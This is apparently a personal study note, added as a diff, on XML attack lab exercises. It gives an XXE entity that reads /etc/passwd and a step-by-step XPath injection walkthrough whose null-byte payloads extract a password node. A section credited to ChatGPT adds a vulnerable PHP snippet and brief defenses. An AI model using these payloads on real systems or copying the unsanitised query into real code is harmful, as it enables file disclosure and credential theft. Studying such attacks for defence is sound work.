@@ -1,0 +1,159 @@
+XML Attacks 01
+
+Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. The following entity can be declared, for example:
+
+<!ENTITY x SYSTEM "file:///etc/passwd">
+
+You will need to envelope this properly, in order to get it to work correctly:
+
+<!DOCTYPE test [
+    <!ENTITY x SYSTEM "file:///etc/passwd">]>
+
+<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+
+ You can then simply use the reference to x: '&x;' (don't forget to encode &) to get the corresponding result inserted in the XML document during its parsing (server side).
+
+
+
+XML Attacks 02
+
+
+In this example, the code uses the user's input, inside an XPath expression. XPath is a query language, which selects nodes from an XML document. Imagine the XML document as a database, and XPath as an SQL query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.
+
+If we inject a single quote, we can see the following error:
+
+ Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
+ Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/index.php on line 22
+ Warning: Variable passed to each() is not an array or object in /var/www/index.php on line 23
+
+
+Just like SQL injection, XPath allows you to do boolean logic, and you can try:
+
+' and '1'='1 and you should get the same result.
+' or '1'='0 and you should get the same result.
+' and '1'='0 and you should not get any result.
+' or '1'='1 and you should get all results.
+
+Based on these tests and previous knowledge of XPath, it's possible to get an idea of what the XPath expression looks like:
+
+[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
+
+To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a ] to properly complete the syntax. Our payload now looks like hacker']%00 (or hacker' or 1=1]%00 if we want all results).
+
+If we try to find the child of the current node, using the payload '%20or%201=1]/child::node()%00, we don't get much information.
+
+Here, the problem is that we need to get back up in the node hierarchy, to get more information. In XPath, this can be done using parent::* as part of the payload. We can now select the parent of the current node, and display all the child node using hacker'%20or%201=1]/parent::*/child::node()%00.
+
+One of the node's value looks like a password. We can confirm this, by checking if the node's name is `password` using the payload hacker']/parent::*/password%00.
+
+
+XML Attacks 02 ChatGPT
+
+XPath (XML Path Language) is a query language used to select nodes from an XML document, similar to how SQL is used to query a database. When user input is incorporated into an XPath expression without proper sanitization, it can lead to XPath Injection vulnerabilities. This allows an attacker to manipulate the XPath query to gain unauthorized access to data.
+
+Step-by-Step XPath Injection Exploitation:
+
+1. Identify the Injection Point:
+   Input fields that interact with XML data, such as search functionalities or filters, are potential targets.
+
+2. Trigger an Error:
+Inject a single quote (') to see if an error is triggered
+
+Example Error:
+Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
+
+3. Crafting Boolean Logic Tests:
+
+Similar to SQL Injection, you can use Boolean logic to manipulate the query.
+
+ ' and '1'='1 (always true, should return results)
+ ' or '1'='0 (always false, should not return results)
+ ' and '1'='0 (always false, should not return results)
+ ' or '1'='1 (always true, should return all results)
+
+
+4. Understanding the XPath Structure:
+
+Based on the responses, you can infer the structure of the XPath expression:
+
+[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
+
+5. Bypassing the Rest of the Query:
+
+To comment out the rest of the XPath expression, use a NULL BYTE (%00):
+
+    Example payloads:
+      hacker']%00
+      hacker' or 1=1]%00 (to get all results)
+
+
+6. Navigating the XML Tree:
+
+To get more information, move up in the node hierarchy using parent::*:
+ Example payload to select parent and display all child nodes:
+  hacker'%20or%201=1]/parent::*/child::node()%00
+
+7. Confirming Sensitive Data:
+
+If a node's value appears to be a password, confirm by checking the node's name:
+ Example payload:
+  hacker']/parent::*/password%00
+
+
+Example Scenario
+  Consider an application that processes an XML document with an XPath query based on user input(php):
+
+   $xml = simplexml_load_file('data.xml');
+   $query = "//user[name='" . $_GET['name'] . "']/info";
+   $result = $xml->xpath($query);
+
+
+
+
+Exploitation:
+
+1. Test for Vulnerability:
+
+Input: '
+Observe error message.
+
+2. Boolean Logic Tests:
+
+Input: ' or '1'='1 (should return results)
+Input: ' and '1'='0 (should not return results)
+
+3. Craft Payload to Bypass and Retrieve Data:
+
+Input: hacker' or 1=1]%00
+
+4. Retrieve All Child Nodes:
+
+Input: hacker'%20or%201=1]/parent::*/child::node()%00
+
+5. Confirm Sensitive Data:
+
+Input: hacker']/parent::*/password%00
+
+
+--Defense Against XPath Injection--
+
+
+1. Sanitize Inputs:
+
+Use functions or libraries that properly escape or sanitize user inputs.
+
+2. Parameterized Queries:
+
+Similar to prepared statements in SQL, use parameterized XPath queries.
+
+3. Input Validation:
+
+Validate inputs against a whitelist of allowed characters or patterns.
+
+4. Limit XML Data Exposure:
+
+Avoid exposing sensitive XML data to user-controlled inputs.
+
+
+
+By following these steps, you can exploit an XPath Injection vulnerability and understand the importance of proper input handling and validation to prevent such attacks.
